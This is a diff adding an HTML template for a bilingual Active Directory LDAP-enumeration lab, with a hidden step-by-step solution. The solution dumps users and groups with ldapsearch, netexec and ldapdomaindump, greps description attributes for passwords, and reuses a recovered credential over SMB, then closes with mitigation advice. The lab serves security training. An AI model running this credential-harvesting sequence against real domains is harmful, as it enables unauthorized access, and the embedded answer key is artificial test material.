@@ -1,0 +1,150 @@
+{% extends "base.html" %}
+{% block title %}AD 02 – LDAP Enumeration – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_ldap_enum_obj_desc">Con la cuenta de servicio svc.readonly, vuelca los objetos del directorio por LDAP. El servidor permite binds simples sin cifrado y un administrador dejó escrita una contraseña —y la flag— en el atributo description de un usuario.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>LDAP · atributo description</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Contexto de nombres del directorio
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
+
+# Volcar descripciones de todos los usuarios
+nxc ldap {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' -M user-desc</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Descubrir el contexto del directorio</h3>
+    <p>El <em>RootDSE</em> se consulta sin autenticación y revela el naming context del dominio.</p>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
+# namingContexts: DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}
+
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre>
+
+    <h3>2 · Bind autenticado con la cuenta de servicio</h3>
+    <p>El servidor tiene <code>ldap server require strong auth = no</code>, así que acepta binds simples en texto claro.</p>
+    <pre>export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
+export DC={{ ad_dc_ip }}
+
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
+
+    <h3>3 · Volcar usuarios, grupos y equipos</h3>
+    <pre># Usuarios (sin cuentas de máquina)
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' \
+  sAMAccountName description memberOf userAccountControl
+
+# Grupos y sus miembros
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(objectClass=group)' sAMAccountName member
+
+# Lo mismo con netexec
+nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' --users
+nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' --groups
+
+# Y con windapsearch / ldapdomaindump
+ldapdomaindump -u '{{ ad_realm_lower }}\svc.readonly' -p 'ReadOnly123!' ldap://$DC -o loot/</pre>
+
+    <h3>4 · Buscar credenciales en los atributos</h3>
+    <p>El atributo <code>description</code> es legible por cualquier usuario autenticado y es donde más credenciales se filtran en dominios reales.</p>
+    <pre># Módulo dedicado de netexec
+nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M user-desc
+
+# A mano, filtrando por palabras clave
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(description=*)' sAMAccountName description \
+  | grep -iE 'pass|pwd|HL\{'</pre>
+    <p>El usuario <code>t.rodriguez</code> devuelve:</p>
+    <pre>sAMAccountName: t.rodriguez
+description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}</pre>
+
+    <h3>5 · Capturar la flag</h3>
+    <pre>HL{···}</pre>
+    <p>Además te llevas una credencial válida más: <code>t.rodriguez / Welcome2024!</code>.</p>
+    <pre>nxc smb $DC -u 't.rodriguez' -p 'Welcome2024!'</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Prohibir credenciales en <code>description</code>, <code>info</code> o <code>comment</code>; auditarlos periódicamente.</li>
+      <li>Exigir LDAP firmado y sellado (<code>ldap server require strong auth = yes</code>, LDAPS obligatorio).</li>
+      <li>Limitar los atributos legibles por usuarios autenticados y monitorizar consultas LDAP masivas.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">ldapsearch</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">ldapdomaindump</span> <span class="tools-badge">windapsearch</span> <span class="tools-badge">bloodyAD</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Discover the directory context</h3>
+    <p>The <em>RootDSE</em> answers without authentication and reveals the domain naming context.</p>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
+# namingContexts: DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}
+
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre>
+
+    <h3>2 · Authenticated bind with the service account</h3>
+    <p>The server runs <code>ldap server require strong auth = no</code>, so it accepts cleartext simple binds.</p>
+    <pre>export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
+export DC={{ ad_dc_ip }}
+
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
+
+    <h3>3 · Dump users, groups and computers</h3>
+    <pre># Users (machine accounts excluded)
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' \
+  sAMAccountName description memberOf userAccountControl
+
+# Groups and their members
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(objectClass=group)' sAMAccountName member
+
+# Same thing with netexec
+nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' --users
+nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' --groups
+
+# And with ldapdomaindump
+ldapdomaindump -u '{{ ad_realm_lower }}\svc.readonly' -p 'ReadOnly123!' ldap://$DC -o loot/</pre>
+
+    <h3>4 · Hunt for credentials in the attributes</h3>
+    <p>The <code>description</code> attribute is readable by any authenticated user and is where most credentials leak in real domains.</p>
+    <pre># Dedicated netexec module
+nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M user-desc
+
+# By hand, filtering on keywords
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(description=*)' sAMAccountName description \
+  | grep -iE 'pass|pwd|HL\{'</pre>
+    <p>User <code>t.rodriguez</code> returns:</p>
+    <pre>sAMAccountName: t.rodriguez
+description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}</pre>
+
+    <h3>5 · Capture the flag</h3>
+    <pre>HL{···}</pre>
+    <p>You also walk away with one more valid credential: <code>t.rodriguez / Welcome2024!</code>.</p>
+    <pre>nxc smb $DC -u 't.rodriguez' -p 'Welcome2024!'</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Ban credentials in <code>description</code>, <code>info</code> or <code>comment</code>; audit them regularly.</li>
+      <li>Require LDAP signing and sealing (<code>ldap server require strong auth = yes</code>, LDAPS only).</li>
+      <li>Restrict which attributes authenticated users can read and monitor bulk LDAP queries.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">ldapsearch</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">ldapdomaindump</span> <span class="tools-badge">windapsearch</span> <span class="tools-badge">bloodyAD</span></div>
+  </div>
+</div>
+{% endblock %}
